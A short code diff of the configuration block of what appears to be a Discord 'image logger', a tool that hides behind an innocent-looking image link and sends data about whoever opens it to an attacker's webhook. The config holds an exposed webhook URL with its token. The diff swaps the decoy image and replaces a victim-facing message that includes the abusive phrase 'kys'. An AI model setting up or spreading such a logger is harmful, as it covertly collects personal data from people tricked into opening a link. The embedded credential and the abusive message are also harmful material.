@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1278477763476590633/fr8339R-Y6CUpCItPcjWkf1tk7Tp8jFcs0OLcAdz4uuXAP75_-63Zedd32HbYFVEYgRM",
-    "image": "https://imgur.com/gallery/supa-man-jrUpT6W", # You can also have a custom image by using a URL argument
+    "image": "https://sausageman.co.uk/wp-content/uploads/2019/03/hot-dogs-UK-wholesale-Vienna-beef-frankfurter.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "image grabbed by abdo kys", # Message to show
+        "message": "ez", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
